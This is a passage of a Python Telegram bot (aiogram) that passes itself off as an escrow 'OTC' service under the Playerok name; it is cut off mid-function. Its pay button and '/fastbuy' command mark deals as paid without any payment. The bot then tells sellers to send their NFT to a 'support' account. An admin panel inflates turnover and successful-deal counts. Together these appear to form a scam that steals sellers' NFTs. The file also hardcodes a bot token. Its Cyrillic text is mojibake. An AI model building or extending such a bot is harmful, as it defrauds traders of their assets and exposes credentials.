import asyncio
import logging
import secrets
import base64
from datetime import datetime
from typing import Optional, Dict, List
from enum import Enum

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    BufferedInputFile
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.utils.markdown import hbold, hcode
import configparser

# –ß—Ç–µ–Ω–∏–µ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏
config = configparser.ConfigParser()
config.read('config.ini')

BOT_TOKEN = '6906381286:AAGXzad1vlRV5aU5lhs8zMWBbaGWudgshA8'
ADMIN_IDS = '2023413492'
SUPPORT_USERNAME = 'SUPPORT_USERNAME'
WEBSITE_URL = 'https://playerok.com/sell'

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(level=logging.INFO)

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(token=BOT_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã
SUPPORTED_CURRENCIES = {
    'STARS': '‚≠ê STARS',
    'TON': 'üíé TON',
    'RUB': 'üá∑üá∫ –†—É–±–ª–∏',
    'KZT': 'üá∞üáø –¢–µ–Ω–≥–µ',
    'BYN': 'üáßüáæ –ë–µ–ª–æ—Ä—É—Å—Å–∫–∏–µ —Ä—É–±–ª–∏',
    'UAH': 'üá∫üá¶ –ì—Ä–∏–≤–Ω—ã'
}

class DealStatus(Enum):
    PENDING = 'pending'
    PAID = 'paid'
    NFT_SENT = 'nft_sent'
    COMPLETED = 'completed'
    DISPUTE = 'dispute'
    CANCELLED = 'cancelled'

class UserRole(Enum):
    USER = 'user'
    ADMIN = 'admin'

# –°–æ—Å—Ç–æ—è–Ω–∏—è FSM
class DealCreation(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_description = State()
    confirming = State()

class AdminActions(StatesGroup):
    adding_balance = State()
    adding_successful_deals = State()
    sending_broadcast = State()
    managing_deal = State()

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö (–≤ —Ä–µ–∞–ª—å–Ω–æ–º –ø—Ä–æ–µ–∫—Ç–µ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ PostgreSQL/MySQL)
class Database:
    def __init__(self):
        self.users: Dict[int, dict] = {}
        self.deals: Dict[str, dict] = {}
        
    def get_user(self, user_id: int) -> dict:
        if user_id not in self.users:
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
            role = UserRole.ADMIN.value if str(user_id) in ADMIN_IDS.split(',') else UserRole.USER.value
            
            self.users[user_id] = {
                'user_id': user_id,
                'username': None,
                'first_name': None,
                'role': role,
                'balance': 0,
                'total_turnover': 0,
                'successful_deals': 0,
                'created_at': datetime.now().isoformat(),
                'deals': []
            }
        return self.users[user_id]
    
    def update_user(self, user_id: int, **kwargs):
        if user_id in self.users:
            self.users[user_id].update(kwargs)
    
    def create_deal(self, creator_id: int, currency: str, amount: float, description: str) -> str:
        # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å–ª—É—á–∞–π–Ω—ã–π —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID
        while True:
            random_part = secrets.token_hex(4).upper()
            deal_id = f"DEAL{random_part}"
            if deal_id not in self.deals:
                break
        
        self.deals[deal_id] = {
            'deal_id': deal_id,
            'creator_id': creator_id,
            'buyer_id': None,
            'currency': currency,
            'amount': amount,
            'description': description,
            'status': DealStatus.PENDING.value,
            'created_at': datetime.now().isoformat(),
            'paid_at': None,
            'completed_at': None,
            'nft_proof': None
        }
        
        # –î–æ–±–∞–≤–ª—è–µ–º —Å–¥–µ–ª–∫—É –≤ —Å–ø–∏—Å–æ–∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        self.users[creator_id]['deals'].append(deal_id)
        
        return deal_id
    
    def get_deal(self, deal_id: str) -> Optional[dict]:
        return self.deals.get(deal_id)
    
    def update_deal(self, deal_id: str, **kwargs):
        if deal_id in self.deals:
            self.deals[deal_id].update(kwargs)
    
    def get_user_deals(self, user_id: int) -> List[dict]:
        user_deals = []
        for deal_id, deal in self.deals.items():
            if deal['creator_id'] == user_id or deal.get('buyer_id') == user_id:
                user_deals.append(deal)
        return user_deals
    
    def get_all_deals(self) -> List[dict]:
        return list(self.deals.values())
    
    def get_pending_deals(self) -> List[dict]:
        return [d for d in self.deals.values() if d['status'] == DealStatus.PENDING.value]
    
    def get_active_deals(self) -> List[dict]:
        active_statuses = [DealStatus.PENDING.value, DealStatus.PAID.value, DealStatus.NFT_SENT.value]
        return [d for d in self.deals.values() if d['status'] in active_statuses]

db = Database()

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã
def get_main_keyboard(user_id: int) -> ReplyKeyboardMarkup:
    keyboard = [
        [KeyboardButton(text="üõí –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É"), KeyboardButton(text="üì± –ü—Ä–æ—Ñ–∏–ª—å")],
        [KeyboardButton(text="‚ÑπÔ∏è –ü–æ–¥–¥–µ—Ä–∂–∫–∞"), KeyboardButton(text="üåê –ù–∞—à —Å–∞–π—Ç")],
        [KeyboardButton(text="üí≥ –†–µ–∫–≤–∏–∑–∏—Ç—ã")]
    ]
    
    # –î–æ–±–∞–≤–ª—è–µ–º –∫–Ω–æ–ø–∫—É –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏ –¥–ª—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤
    user = db.get_user(user_id)
    if user['role'] == UserRole.ADMIN.value:
        keyboard.append([KeyboardButton(text="üëë –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å")])
    
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)

def get_currencies_keyboard() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    for code, name in SUPPORTED_CURRENCIES.items():
        builder.button(text=name, callback_data=f"currency_{code}")
    builder.button(text="üîô –û—Ç–º–µ–Ω–∞", callback_data="cancel")
    builder.adjust(2)
    return builder.as_markup()

def get_deal_actions_keyboard(deal_id: str, user_role: str = UserRole.USER.value) -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    deal = db.get_deal(deal_id)
    
    if deal['status'] == DealStatus.PENDING.value:
        builder.button(text="üí≥ –û–ø–ª–∞—Ç–∏—Ç—å", callback_data=f"pay_{deal_id}")
        builder.button(text="‚ùå –û—Ç–º–µ–Ω–∏—Ç—å", callback_data=f"cancel_{deal_id}")
    
    if user_role == UserRole.ADMIN.value:
        if deal['status'] == DealStatus.PAID.value:
            builder.button(text="‚úÖ NFT –ø–æ–ª—É—á–µ–Ω", callback_data=f"admin_nft_{deal_id}")
        elif deal['status'] == DealStatus.NFT_SENT.value:
            builder.button(text="üéÅ –ó–∞–≤–µ—Ä—à–∏—Ç—å —Å–¥–µ–ª–∫—É", callback_data=f"admin_complete_{deal_id}")
        elif deal['status'] == DealStatus.DISPUTE.value:
            builder.button(text="‚öñÔ∏è –†–µ—à–∏—Ç—å —Å–ø–æ—Ä", callback_data=f"admin_resolve_{deal_id}")
    
    builder.button(text="üîÑ –û–±–Ω–æ–≤–∏—Ç—å", callback_data=f"refresh_{deal_id}")
    builder.adjust(2)
    return builder.as_markup()

def get_admin_keyboard() -> InlineKeyboardMarkup:
    builder = InlineKeyboardBuilder()
    builder.button(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")
    builder.button(text="üíº –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–¥–µ–ª–∫–∞–º–∏", callback_data="admin_deals")
    builder.button(text="üí∞ –ù–∞–∫—Ä—É—Ç–∏—Ç—å –æ–±–æ—Ä–æ—Ç—ã", callback_data="admin_add_turnover")
    builder.button(text="‚úÖ –ù–∞–∫—Ä—É—Ç–∏—Ç—å —É—Å–ø–µ—à–Ω—ã–µ —Å–¥–µ–ª–∫–∏", callback_data="admin_add_success")
    builder.button(text="üì¢ –†–∞—Å—Å—ã–ª–∫–∞", callback_data="admin_broadcast")
    builder.button(text="üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏", callback_data="admin_users")
    builder.button(text="üîô –ù–∞–∑–∞–¥", callback_data="admin_back")
    builder.adjust(2)
    return builder.as_markup()

# –ö–∞—Ä—Ç–∏–Ω–∫–∞ –¥–ª—è –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏—è (base64 –±–µ–∑ –ø—Ä–µ—Ñ–∏–∫—Å–∞)
WELCOME_IMAGE_BASE64 = (
    "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"
)

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥
@dp.message(CommandStart())
async def cmd_start(message: types.Message, command: CommandStart):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    
    # –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
    db.update_user(user_id, 
                   username=message.from_user.username,
                   first_name=message.from_user.first_name)
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –ø–µ—Ä–µ—à–ª–∏ –ª–∏ –ø–æ —Å—Å—ã–ª–∫–µ —Å –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º deal_...
    args = command.args
    if args and args.startswith("deal_"):
        deal_id = args[5:].upper()
        deal = db.get_deal(deal_id)
        if not deal:
            await message.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
            return
        if deal['status'] != DealStatus.PENDING.value:
            await message.answer("‚ùå –≠—Ç–∞ —Å–¥–µ–ª–∫–∞ —É–∂–µ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã")
            return
        if deal['creator_id'] == user_id:
            await message.answer("‚ùå –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –æ–ø–ª–∞—Ç–∏—Ç—å —Å–≤–æ—é —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—É—é —Å–¥–µ–ª–∫—É")
            return
        
        # –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø—Ä–æ–¥–∞–≤—Ü–µ
        seller = db.get_user(deal['creator_id'])
        seller_info = f"{seller['first_name']}"
        if seller['username']:
            seller_info += f" (@{seller['username']})"
        
        # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å–¥–µ–ª–∫–µ –∏ –∫–Ω–æ–ø–∫—É –æ–ø–ª–∞—Ç—ã
        kb = InlineKeyboardMarkup(inline_keyboard=[[
            InlineKeyboardButton(text="üí≥ –û–ø–ª–∞—Ç–∏—Ç—å", callback_data=f"pay_{deal_id}")
        ]])
        await message.answer(
            f"–í—ã —Ö–æ—Ç–∏—Ç–µ –æ–ø–ª–∞—Ç–∏—Ç—å —Å–¥–µ–ª–∫—É:\n\n"
            f"ID: #{deal_id}\n"
            f"–ü—Ä–æ–¥–∞–≤–µ—Ü: {seller_info}\n"
            f"–°—É–º–º–∞: {deal['amount']} {SUPPORTED_CURRENCIES[deal['currency']]}\n"
            f"–û–ø–∏—Å–∞–Ω–∏–µ: {deal['description']}\n\n"
            f"–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É '–û–ø–ª–∞—Ç–∏—Ç—å', —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å.",
            reply_markup=kb
        )
        return
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞—Ä—Ç–∏–Ω–∫—É —Å –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏–µ–º (–∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ –∏–∑ base64)
    image_data = base64.b64decode(WELCOME_IMAGE_BASE64)
    photo = BufferedInputFile(image_data, filename="welcome.png")
    
    await message.answer_photo(
        photo=photo,
        caption=(
            f"{hbold('üõ° Playerok Bot | OTC')}\n\n"
            f"–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∏ —É–¥–æ–±–Ω—ã–π —Å–µ—Ä–≤–∏—Å –¥–ª—è —Å–¥–µ–ª–æ–∫!\n\n"
            f"üîπ {hbold('–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç:')}\n"
            f"1. –ü—Ä–æ–¥–∞–≤–µ—Ü —Å–æ–∑–¥–∞–µ—Ç —Å–¥–µ–ª–∫—É\n"
            f"2. –ü–æ–∫—É–ø–∞—Ç–µ–ª—å –æ–ø–ª–∞—á–∏–≤–∞–µ—Ç —Å–¥–µ–ª–∫—É –ø–æ —Ä–µ–∫–≤–∏–∑–∏—Ç–æ–º\n"
            f"3. –ü—Ä–æ–¥–∞–≤–µ—Ü –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç NFT –ø–æ–¥–¥–µ—Ä–∂–∫–µ\n"
            f"4. –ü–æ–¥–¥–µ—Ä–∂–∫–∞ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –∏ –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Å–¥–µ–ª–∫—É\n\n"
            f"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ –≤ –º–µ–Ω—é –Ω–∏–∂–µ:"
        ),
        reply_markup=get_main_keyboard(user_id),
        parse_mode="HTML"
    )

@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    user_id = message.from_user.id
    user = db.get_user(user_id)
    if user['role'] != UserRole.ADMIN.value:
        await message.answer("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–¥–º–∏–Ω-–ø–∞–Ω–µ–ª–∏")
        return
    await message.answer(
        f"{hbold('üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–Ω–µ–ª—å')}\n\n"
        f"–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
        reply_markup=get_admin_keyboard(),
        parse_mode="HTML"
    )

@dp.message(F.text == "üõí –°–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É")
async def create_deal_start(message: types.Message, state: FSMContext):
    await state.set_state(DealCreation.choosing_currency)
    await message.answer(
        "–í—ã–±–µ—Ä–∏—Ç–µ –≤–∞–ª—é—Ç—É –¥–ª—è —Å–¥–µ–ª–∫–∏:",
        reply_markup=get_currencies_keyboard()
    )

@dp.callback_query(lambda c: c.data.startswith('currency_'), StateFilter(DealCreation.choosing_currency))
async def process_currency(callback: types.CallbackQuery, state: FSMContext):
    currency = callback.data.replace('currency_', '')
    await state.update_data(currency=currency)
    await state.set_state(DealCreation.entering_amount)
    
    await callback.message.edit_text(
        f"–í—ã–±—Ä–∞–Ω–∞ –≤–∞–ª—é—Ç–∞: {SUPPORTED_CURRENCIES[currency]}\n\n"
        f"–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É —Å–¥–µ–ª–∫–∏:"
    )
    await callback.answer()

@dp.message(DealCreation.entering_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—É—é –ø–æ–ª–æ–∂–∏—Ç–µ–ª—å–Ω—É—é —Å—É–º–º—É")
        return
    
    await state.update_data(amount=amount)
    await state.set_state(DealCreation.entering_description)
    await message.answer("üéÅ –í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É(-–∏) –Ω–∞ –ø–æ–¥–∞—Ä–æ–∫(-–∏) –≤ –æ–¥–Ω–æ–º –∏–∑ —Ñ–æ—Ä–º–∞—Ç–æ–≤: https://... –∏–ª–∏ t.me/... –ù–∞–ø—Ä–∏–º–µ—Ä: t.me/nft/DurovsCap-1")

@dp.message(DealCreation.entering_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text
    await state.update_data(description=description)
    
    data = await state.get_data()
    currency = data['currency']
    amount = data['amount']
    
    confirm_text = (
        f"{hbold('–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —Å–æ–∑–¥–∞–Ω–∏—è —Å–¥–µ–ª–∫–∏:')}\n\n"
        f"üí± –í–∞–ª—é—Ç–∞: {SUPPORTED_CURRENCIES[currency]}\n"
        f"üí∞ –°—É–º–º–∞: {amount}\n"
        f"üìù –û–ø–∏—Å–∞–Ω–∏–µ: {description}\n\n"
        f"–í—Å—ë –≤–µ—Ä–Ω–æ?"
    )
    
    builder = InlineKeyboardBuilder()
    builder.button(text="‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", callback_data="confirm_deal")
    builder.button(text="‚ùå –û—Ç–º–µ–Ω–∞", callback_data="cancel")
    
    await state.set_state(DealCreation.confirming)
    await message.answer(
        confirm_text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data == "confirm_deal", StateFilter(DealCreation.confirming))
async def confirm_deal(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    
    deal_id = db.create_deal(
        creator_id=callback.from_user.id,
        currency=data['currency'],
        amount=data['amount'],
        description=data['description']
    )
    
    await state.clear()
    
    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ —Å–¥–µ–ª–∫—É
    bot_username = (await callback.bot.me()).username
    deal_link = f"https://t.me/{bot_username}?start=deal_{deal_id}"
    
    success_text = (
        f"{hbold('‚úÖ –°–¥–µ–ª–∫–∞ —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω–∞!')}\n\n"
        f"ID —Å–¥–µ–ª–∫–∏: {hcode('#' + deal_id)}\n"
        f"üí± –í–∞–ª—é—Ç–∞: {SUPPORTED_CURRENCIES[data['currency']]}\n"
        f"üí∞ –°—É–º–º–∞: {data['amount']}\n\n"
        f"–°—Å—ã–ª–∫–∞ –¥–ª—è –ø–æ–∫—É–ø–∞—Ç–µ–ª—è:\n"
        f"{deal_link}\n\n"
        f"–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã –≤–∞–º –Ω—É–∂–Ω–æ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å NFT –ø–æ–¥–¥–µ—Ä–∂–∫–µ."
    )
    
    await callback.message.edit_text(
        success_text,
        parse_mode="HTML"
    )
    await callback.answer()

@dp.message(Command("fastbuy"))
async def fast_buy(message: types.Message):
    args = message.text.split()
    if len(args) != 2:
        await message.answer(
            "‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã.\n"
            "–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /fastbuy ID_–°–î–ï–õ–ö–ò"
        )
        return
    
    deal_id = args[1].upper()
    if deal_id.startswith('#'):
        deal_id = deal_id[1:]
    
    deal = db.get_deal(deal_id)
    
    if not deal:
        await message.answer("‚ùå –°–¥–µ–ª–∫–∞ —Å —Ç–∞–∫–∏–º ID –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return
    
    if deal['status'] != DealStatus.PENDING.value:
        await message.answer("‚ùå –≠—Ç–∞ —Å–¥–µ–ª–∫–∞ —É–∂–µ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã")
        return
    
    if deal['creator_id'] == message.from_user.id:
        await message.answer("‚ùå –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –æ–ø–ª–∞—Ç–∏—Ç—å —Å–≤–æ—é —Å–¥–µ–ª–∫—É")
        return
    
    # –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–∫—É–ø–∞—Ç–µ–ª–µ
    db.update_deal(deal_id, 
                   buyer_id=message.from_user.id,
                   status=DealStatus.PAID.value,
                   paid_at=datetime.now().isoformat())
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø—Ä–æ–¥–∞–≤—Ü–∞
    seller_id = deal['creator_id']
    try:
        seller_notification = (
            f"{hbold('üí∞ –ü–æ–ª—É—á–µ–Ω–∞ –æ–ø–ª–∞—Ç–∞ –ø–æ —Å–¥–µ–ª–∫–µ!')}\n\n"
            f"ID —Å–¥–µ–ª–∫–∏: {hcode('#' + deal_id)}\n"
            f"–°—É–º–º–∞: {deal['amount']} {SUPPORTED_CURRENCIES[deal['currency']]}\n\n"
            f"–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ NFT –Ω–∞—à–µ–º—É —Å–∞–ø–ø–æ—Ä—Ç—É: @{SUPPORT_USERNAME}"
        )
        await bot.send_message(seller_id, seller_notification, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Failed to notify seller: {e}")
    
    await message.answer(
        f"{hbold('‚úÖ –û–ø–ª–∞—Ç–∞ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∞!')}\n\n"
        f"–ü—Ä–æ–¥–∞–≤–µ—Ü —É–≤–µ–¥–æ–º–ª–µ–Ω. –û–∂–∏–¥–∞–π—Ç–µ –ø–µ—Ä–µ–¥–∞—á–∏ NFT –≥–∞—Ä–∞–Ω—Ç—É.",
        parse_mode="HTML"
    )

@dp.callback_query(lambda c: c.data.startswith('pay_'))
async def process_pay(callback: types.CallbackQuery):
    deal_id = callback.data.replace('pay_', '')
    deal = db.get_deal(deal_id)
    
    if not deal:
        await callback.answer("‚ùå –°–¥–µ–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞")
        return
    if deal['status'] != DealStatus.PENDING.value:
        await callback.answer("‚ùå –≠—Ç–∞ —Å–¥–µ–ª–∫–∞ —É–∂–µ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã")
        return
    if deal['creator_id'] == callback.from_user.id:
        await callback.answer("‚ùå –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –æ–ø–ª–∞—Ç–∏—Ç—å —Å–≤–æ—é —Å–¥–µ–ª–∫—É")
        return
    
    # –û–±–Ω–æ–≤–ª—è–µ–º —Å–¥–µ–ª–∫—É
    db.update_deal(deal_id,
                   buyer_id=callback.from_user.id,
                   status=DealStatus.PAID.value,
                   paid_at=datetime.now().isoformat())
    
    # –£–≤–µ–¥–æ–º–ª—è–µ–º –ø—Ä–æ–¥–∞–≤—Ü–∞
    seller_id = deal['creator_id']
    try:
        seller_notification = (
            f"{hbold('üí∞ –ü–æ–ª—É—á–µ–Ω–∞ –æ–ø–ª–∞—Ç–∞ –ø–æ —Å–¥–µ–ª–∫–µ!')}\n\n"
            f"ID —Å–¥–µ–ª–∫–∏: {hcode('#' + deal_id)}\n"
            f"–°—É–º–º–∞: {deal['amount']} {SUPPORTED_CURRENCIES[deal['currency']]}\n\n"
            f"–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ NFT –Ω–∞—à–µ–º—É —Å–∞–ø–ø–æ—Ä—Ç—É: @{SUPPORT_USERNAME}"
        )
        await callback.bot.send_message(seller_id, seller_notification, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Failed to notify seller: {e}")
    
    await callback.message.edit_text(
